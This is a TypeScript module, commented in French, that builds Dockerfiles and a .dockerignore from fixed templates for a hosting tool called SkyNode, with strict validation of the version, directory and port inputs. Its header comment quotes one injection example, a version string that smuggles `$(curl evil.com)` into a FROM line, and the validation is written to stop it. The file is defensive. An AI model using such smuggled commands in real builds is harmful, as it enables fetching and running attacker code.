import type { OutputMode, RuntimeFamily } from "./project-analyze.js"

/**
 * Cinq gabarits de `Dockerfile`, écrits et éprouvés une fois pour toutes les exécutions.
 *
 * L'IA ne rédige jamais le texte : elle choisit un gabarit (`pickTemplate`) et en fixe
 * les paramètres (`DockerfileParams`), déduits du constat du jalon 2. Un `Dockerfile`
 * écrit à la volée serait différent à chaque exécution, jamais testé au préalable, et
 * ses échecs arriveraient au support de SkyNode plutôt qu'à un correctif du gabarit.
 *
 * Chaque paramètre passe son propre motif avant de rejoindre la moindre chaîne composée :
 * `version` et `repertoire` proviennent d'une déduction sur le dépôt d'un client, donc
 * indirectement d'un texte que l'agent a lu. Un `FROM node:$(curl evil.com)-alpine` doit
 * rester impossible, pas seulement improbable.
 */

export interface DockerfileParams {
  famille: "node" | "python" | "static"
  sortie: "server" | "standalone" | "static"
  version: string
  gestionnaire: "pnpm" | "npm" | "yarn" | "bun" | null
  port: number
  /** Le répertoire produit par la construction, pour les sorties statiques. */
  repertoire: string | null
}

/** Une version de runtime, et rien d'autre : ni option, ni commande, ni chemin. */
const VERSION_PATTERN = /^\d+(\.\d+){0,2}$/

/** Un chemin relatif simple, sous la racine du projet. */
const DIRECTORY_PATTERN = /^[A-Za-z0-9._-]+(\/[A-Za-z0-9._-]+)*$/

/** La plage applicative. En deçà, il faudrait des privilèges que le conteneur n'a pas. */
const PORT_MIN = 1
const PORT_MAX = 65535

/**
 * La commande d'installation par gestionnaire, verrouillée sur le fichier de lock qu'il
 * produit.
 *
 * `corepack enable` seul active la dernière version publiée de pnpm ou yarn, sans épingle
 * — c'est exactement l'incident déjà vécu par ce dépôt (voir `CLAUDE.md` à la racine :
 * la sortie de pnpm 11.18.0 a cassé les deux images de SkyNode sans qu'une ligne du projet
 * n'ait changé). `DockerfileParams` ne porte que la famille du gestionnaire (`"pnpm"`),
 * jamais la version que le client a figée dans son `packageManager` — ce gabarit ne peut
 * donc pas la lire pour l'épingler ici. Le risque reste ouvert tant qu'un champ dédié
 * n'est pas ajouté au contrat du plan (hors périmètre de cette tâche).
 */
const INSTALL: Record<"pnpm" | "npm" | "yarn" | "bun", string> = {
  pnpm: "corepack enable && pnpm install --frozen-lockfile",
  npm: "npm ci",
  yarn: "corepack enable && yarn install --frozen-lockfile",
  bun: "bun install --frozen-lockfile",
}

/**
 * `bun` n'existe pas dans les images `node:*-alpine` : l'étape de construction a besoin
 * de son propre binaire, faute de quoi `bun install` échoue dès sa première commande —
 * mesuré en relecture (I5) sur les trois gabarits qui construisent depuis Node. Bun a son
 * propre schéma de version, distinct de celui de Node : on épingle donc sa branche
 * majeure stable plutôt que de réutiliser `params.version`, qui continue de décrire le
 * Node de l'étape finale d'exécution — seule l'étape de construction change de base.
 */
function builderImage(params: DockerfileParams): string {
  return params.gestionnaire === "bun" ? "oven/bun:1-alpine" : `node:${params.version}-alpine`
}

/** L'image `oven/bun` n'a pas de binaire `npm` : le script `build` s'invoque via `bun run`. */
function buildCommand(gestionnaire: DockerfileParams["gestionnaire"]): string {
  return gestionnaire === "bun" ? "bun run build" : "npm run build"
}

/**
 * `EXPOSE` documente un port, il ne le fait pas écouter : la configuration par défaut de
 * `nginx:alpine` reste sur le port 80 quel que soit le port choisi ici, et un serveur qui
 * écoute au mauvais endroit reste `Up` tout en ne répondant jamais — mesuré en
 * construction réelle (relecture, C1). On réécrit le bloc serveur entier avec le port
 * effectif plutôt que de compter sur la valeur par défaut de l'image.
 */
function nginxListenCommand(port: number): string {
  const conf =
    "server {\\n" +
    `    listen ${port};\\n` +
    `    listen [::]:${port};\\n` +
    "    server_name _;\\n" +
    "    root /usr/share/nginx/html;\\n" +
    "    index index.html index.htm;\\n" +
    "    location / {\\n" +
    "        try_files $uri $uri/ =404;\\n" +
    "    }\\n" +
    "}\\n"

  return `RUN printf '${conf}' > /etc/nginx/conf.d/default.conf`
}

/**
 * Sans gestionnaire détecté, il n'y a pas de fichier de verrouillage à figer : `npm ci`
 * échouerait sur un dépôt par ailleurs valide. `npm install` est la seule commande qui
 * fonctionne dans ce cas, quel que soit l'écosystème d'origine.
 */
const FALLBACK_INSTALL = "npm install"

function installCommand(gestionnaire: DockerfileParams["gestionnaire"]): string {
  return gestionnaire === null ? FALLBACK_INSTALL : INSTALL[gestionnaire]
}

function copyCommand(gestionnaire: DockerfileParams["gestionnaire"]): string {
  // Chaque gestionnaire a son propre fichier de verrouillage ; le copier seul (plutôt que
  // tout le dépôt) est ce qui permet à Docker de mettre en cache l'étape d'installation
  // tant que les dépendances n'ont pas changé.
  switch (gestionnaire) {
    case "pnpm":
      return "COPY package.json pnpm-lock.yaml* ./"
    case "yarn":
      return "COPY package.json yarn.lock* ./"
    case "bun":
      return "COPY package.json bun.lock* bun.lockb* ./"
    case "npm":
      return "COPY package.json package-lock.json* ./"
    case null:
      return "COPY package.json ./"
  }
}

function validateVersion(version: string): void {
  if (!VERSION_PATTERN.test(version)) {
    throw new Error(`version invalide : « ${version} » n'est pas un numéro de version (ex. « 22 », « 3.12 »)`)
  }
}

function validateDirectory(repertoire: string): void {
  // Le motif seul laisse passer « ../etc » : les deux points appartiennent à la classe de
  // caractères autorisée, et rien n'empêche un segment de valoir exactement « .. ». On
  // rejette donc aussi tout segment de traversée, en plus des caractères interdits.
  const segments = repertoire.split("/")
  const traverses = segments.some((segment) => segment === "" || segment === "." || segment === "..")

  if (!DIRECTORY_PATTERN.test(repertoire) || traverses) {
    throw new Error(`répertoire de sortie invalide : « ${repertoire} » doit être un chemin relatif simple`)
  }
}

function validatePort(port: number): void {
  if (!Number.isInteger(port) || port < PORT_MIN || port > PORT_MAX) {
    throw new Error(`port invalide : ${port} doit être un entier entre ${PORT_MIN} et ${PORT_MAX}`)
  }
}

/** Toutes les validations avant qu'aucune chaîne ne soit composée avec ces valeurs. */
function validate(params: DockerfileParams): void {
  validateVersion(params.version)
  validatePort(params.port)
  if (params.repertoire !== null) validateDirectory(params.repertoire)
}

export function generateDockerfile(params: DockerfileParams): string {
  validate(params)

  switch (params.famille) {
    case "node":
      return params.sortie === "static" ? nodeStatic(params) : nodeServerOrStandalone(params)
    case "python":
      return pythonServer(params)
    case "static":
      return staticSite(params)
  }
}

/**
 * Node, sorties `server` et `standalone` : une étape de construction complète (avec les
 * `devDependencies`), une étape d'exécution allégée qui ne recopie que le nécessaire.
 * `standalone` (Next.js) ne recopie même pas `node_modules` : le dossier `.next/standalone`
 * embarque déjà ses dépendances.
 */
function nodeServerOrStandalone(params: DockerfileParams): string {
  const install = installCommand(params.gestionnaire)
  const copyLock = copyCommand(params.gestionnaire)

  if (params.sortie === "standalone") {
    return [
      `FROM ${builderImage(params)} AS builder`,
      "WORKDIR /app",
      copyLock,
      `RUN ${install}`,
      "COPY . .",
      // `public/` n'est pas garanti : un dépôt minimal ou vibe-codé peut ne pas en avoir.
      // Le créer ici, avant la copie multi-étapes qui suit, évite un `COPY` en échec sur
      // un répertoire absent — la construction ne doit pas dépendre d'un dossier que
      // create-next-app scaffolde par convention, jamais par obligation.
      "RUN mkdir -p public",
      `RUN ${buildCommand(params.gestionnaire)}`,
      "",
      `FROM node:${params.version}-alpine`,
      "WORKDIR /app",
      "RUN addgroup -S skynode && adduser -S skynode -G skynode",
      // `--chown` sur les trois copies, sinon `.next` appartient à root : la première
      // page ISR ou le premier `next/image` tente d'écrire dans un répertoire qu'il ne
      // possède pas et échoue à l'exécution, jamais à la construction — mesuré en
      // relecture (I1), même classe de défaut que le `/var/run` déjà corrigé plus haut.
      "COPY --from=builder --chown=skynode:skynode /app/.next/standalone ./",
      "COPY --from=builder --chown=skynode:skynode /app/.next/static ./.next/static",
      "COPY --from=builder --chown=skynode:skynode /app/public ./public",
      // `.next/cache` n'est pas livré par la construction : Next le crée à la première
      // requête. Sans ce répertoire, déjà possédé par l'utilisateur applicatif, la même
      // écriture échoue au même titre que les trois copies ci-dessus.
      "RUN mkdir -p .next/cache && chown -R skynode:skynode .next/cache",
      // `server.js` lit `PORT` : sans cette variable, Next reste sur son défaut (3000)
      // quel que soit l'`EXPOSE` déclaré — le port choisi devient alors décoratif, mesuré
      // en relecture (C1). `HOSTNAME` évite de n'écouter que sur l'adresse du conteneur,
      // qui ne fonctionne qu'en bridge par accident (I2).
      `ENV PORT=${params.port}`,
      "ENV HOSTNAME=0.0.0.0",
      "USER skynode",
      `EXPOSE ${params.port}`,
      'CMD ["node", "server.js"]',
      "",
    ].join("\n")
  }

  // `server` : l'application se lance via son propre script `start`, `node_modules`
  // (hors devDependencies) doit donc survivre jusqu'à l'exécution.
  return [
    `FROM ${builderImage(params)} AS builder`,
    "WORKDIR /app",
    copyLock,
    `RUN ${install}`,
    "COPY . .",
    // Un serveur applicatif dépend souvent de fichiers que la construction ne produit
    // pas : vues, traductions, gabarits, schéma de migrations. Aucun n'est garanti, et un
    // `COPY` sur un répertoire absent ferait échouer la construction — même motif de
    // garde que `public/` plus haut, pour ne pas livrer un conteneur qui démarre et reste
    // `Up` tout en rendant `ENOENT` à la première requête (I4).
    "RUN mkdir -p public views locales prisma static templates",
    `RUN ${buildCommand(params.gestionnaire)}`,
    "",
    `FROM node:${params.version}-alpine`,
    "WORKDIR /app",
    "ENV NODE_ENV=production",
    "RUN addgroup -S skynode && adduser -S skynode -G skynode",
    copyLock,
    `RUN ${gestionnaireProdInstall(params.gestionnaire)}`,
    "COPY --from=builder /app/dist ./dist",
    "COPY --from=builder /app/public ./public",
    "COPY --from=builder /app/views ./views",
    "COPY --from=builder /app/locales ./locales",
    "COPY --from=builder /app/prisma ./prisma",
    "COPY --from=builder /app/static ./static",
    "COPY --from=builder /app/templates ./templates",
    // La convention Node dominante est `process.env.PORT` : une application qui la suit
    // écoute sur son défaut codé en dur (3000, le plus souvent) tant que rien ne fixe
    // cette variable, quel que soit le port annoncé par `EXPOSE`. Le conteneur reste
    // alors `Up` et ne répond jamais — le même mode d'échec que C1, sur le seul gabarit
    // qui y avait échappé. Le coût si l'application l'ignore est nul (une variable sans
    // effet) ; le coût de l'omettre est un déploiement silencieusement mort.
    `ENV PORT=${params.port}`,
    "USER skynode",
    `EXPOSE ${params.port}`,
    'CMD ["npm", "start"]',
    "",
  ].join("\n")
}

/** L'étape d'exécution n'a besoin que des dépendances de production, jamais des outils de build. */
function gestionnaireProdInstall(gestionnaire: DockerfileParams["gestionnaire"]): string {
  switch (gestionnaire) {
    case "pnpm":
      return "corepack enable && pnpm install --prod --frozen-lockfile"
    case "yarn":
      return "corepack enable && yarn install --production --frozen-lockfile"
    case "bun":
      return "bun install --production --frozen-lockfile"
    case "npm":
      return "npm ci --omit=dev"
    case null:
      return "npm install --omit=dev"
  }
}

/**
 * Node, sortie `static` : la construction produit un répertoire de fichiers (Vite, par
 * exemple) qu'un serveur web statique sert seul, sans runtime Node en production.
 */
function nodeStatic(params: DockerfileParams): string {
  const install = installCommand(params.gestionnaire)
  const copyLock = copyCommand(params.gestionnaire)
  const repertoire = params.repertoire ?? "dist"
  validateDirectory(repertoire)

  return [
    `FROM ${builderImage(params)} AS builder`,
    "WORKDIR /app",
    copyLock,
    `RUN ${install}`,
    "COPY . .",
    `RUN ${buildCommand(params.gestionnaire)}`,
    "",
    "FROM nginx:alpine",
    `COPY --from=builder /app/${repertoire} /usr/share/nginx/html`,
    "RUN addgroup -S skynode && adduser -S skynode -G skynode " +
      "&& chown -R skynode:skynode /usr/share/nginx/html " +
      "&& chown -R skynode:skynode /var/cache/nginx /run",
    nginxListenCommand(params.port),
    "USER skynode",
    `EXPOSE ${params.port}`,
    'CMD ["nginx", "-g", "daemon off;"]',
    "",
  ].join("\n")
}

/**
 * Python, sortie `server` (ASGI) : une étape qui compile les dépendances éventuellement
 * natives, une étape d'exécution qui ne recopie que le paquet installé — jamais les
 * en-têtes ni le compilateur qui l'ont produit.
 */
/**
 * Deux hypothèses non paramétrées, assumées volontairement (I6) : `requirements.txt` est
 * le seul format de dépendances lu (pas de `pyproject.toml`/`poetry.lock`), et le point
 * d'entrée ASGI est toujours `main:app`. Les deux échecs sont bruyants — `pip` refuse
 * l'absence du premier, `uvicorn` refuse l'absence du second — donc acceptables pour ce
 * jalon. `DockerfileParams` n'a pas de champ pour l'un ou l'autre : les paramétrer est un
 * travail pour la tâche 4, pas un oubli de celle-ci.
 */
function pythonServer(params: DockerfileParams): string {
  return [
    `FROM python:${params.version}-slim AS builder`,
    "WORKDIR /app",
    "COPY requirements.txt .",
    "RUN pip install --user --no-cache-dir -r requirements.txt",
    "COPY . .",
    "",
    `FROM python:${params.version}-slim`,
    "WORKDIR /app",
    "RUN useradd --system --create-home skynode",
    "COPY --from=builder /root/.local /home/skynode/.local",
    "COPY --from=builder /app .",
    "ENV PATH=/home/skynode/.local/bin:$PATH",
    // Sans cette variable, la sortie standard de Python est bufferisée par bloc dès
    // qu'elle ne va pas vers un terminal — le cas de `docker logs`. Les journaux
    // n'apparaissent alors qu'en rafale, ou jamais si le conteneur s'arrête avant que le
    // tampon ne se vide : précisément le moment où le support en a besoin (M5).
    "ENV PYTHONUNBUFFERED=1",
    "RUN chown -R skynode:skynode /app",
    "USER skynode",
    `EXPOSE ${params.port}`,
    `CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "${params.port}"]`,
    "",
  ].join("\n")
}

/**
 * Statique pur (aucune construction Node ou Python) : le dépôt contient déjà les
 * fichiers à servir. La première étape n'existe que pour respecter l'invariant « au
 * moins deux `FROM` » et fixer les permissions avant de passer la main à `nginx`.
 */
function staticSite(params: DockerfileParams): string {
  const repertoire = params.repertoire ?? "."

  return [
    // Épinglée (M1) : `busybox:latest` changerait l'image sous les pieds du client à
    // chaque reconstruction, pour une étape qui ne fait pourtant que recopier des
    // fichiers déjà présents dans le dépôt.
    "FROM busybox:1.36 AS prepare",
    "WORKDIR /site",
    `COPY ${repertoire} .`,
    "",
    "FROM nginx:alpine",
    "COPY --from=prepare /site /usr/share/nginx/html",
    "RUN addgroup -S skynode && adduser -S skynode -G skynode " +
      "&& chown -R skynode:skynode /usr/share/nginx/html " +
      "&& chown -R skynode:skynode /var/cache/nginx /run",
    nginxListenCommand(params.port),
    "USER skynode",
    `EXPOSE ${params.port}`,
    'CMD ["nginx", "-g", "daemon off;"]',
    "",
  ].join("\n")
}

/**
 * Ce qui ne doit jamais entrer dans une image, quel que soit le gabarit choisi :
 * dépendances déjà réinstallées dans le conteneur, historique git, artefacts d'une
 * construction locale, et surtout tout fichier d'environnement — un `.env` copié dans une
 * couche d'image est lisible par quiconque obtient cette image, y compris longtemps après
 * qu'un secret a été changé côté client.
 *
 * Les motifs ancrés à la racine (`.env`, `.npmrc`) ne couvrent pas un monorepo — le cas
 * courant chez la cible (`apps/web` + `packages/api`) — où le secret vit à
 * `apps/api/.env` ou où `.npmrc` porte un jeton d'authentification npm à la racine d'un
 * paquet imbriqué. `**` couvre les deux profondeurs sans dupliquer la règle par
 * sous-dossier (mesuré en relecture, C2 : `/ctx/apps/api/.env` et `/ctx/.npmrc`
 * échappaient tous deux aux motifs précédents).
 *
 * `preserveDir` réintroduit un répertoire par ailleurs exclu ici (`dist`, `build`) : le
 * gabarit statique pur (`pickTemplate` → `"static"`) sert un site déjà construit et
 * committé, dont le dossier s'appelle presque toujours `dist` ou `build` — sans cette
 * exception, `.dockerignore` et le `Dockerfile` qu'il accompagne s'annulent l'un l'autre
 * (I3). Le paramètre reste optionnel : la tâche 4 le fournit quand la sortie est
 * statique, et l'appel sans argument garde le comportement déjà éprouvé pour tous les
 * autres gabarits.
 */
export function generateDockerignore(preserveDir: string | null = null): string {
  const lignes = [
    "node_modules",
    ".git",
    ".gitignore",
    ".env",
    ".env.*",
    "**/.env",
    "**/.env.*",
    "!.env.example",
    ".npmrc",
    "**/.npmrc",
    "Dockerfile",
    ".dockerignore",
    ".next",
    "dist",
    "build",
    ".venv",
    "venv",
    "__pycache__",
    "*.pyc",
    "*.log",
    ".DS_Store",
  ]

  if (preserveDir !== null) {
    validateDirectory(preserveDir)
    lignes.push(`!${preserveDir}`)
  }

  return [...lignes, ""].join("\n")
}

/**
 * Trois familles, trois sorties couvertes — les seules pour lesquelles un gabarit existe
 * et a été éprouvé. PHP, Go et tout ce qui reste `inconnu` n'ont pas d'équivalent : rendre
 * `null` ici fait renoncer le composeur plutôt que de lui faire improviser un gabarit
 * jamais testé (spec §5.4).
 */
export function pickTemplate(
  family: RuntimeFamily,
  output: OutputMode
): DockerfileParams["sortie"] | null {
  if (family === "node" && (output === "server" || output === "standalone" || output === "static")) {
    return output
  }
  if (family === "python" && output === "server") return "server"
  if (family === "static" && output === "static") return "static"
  return null
}
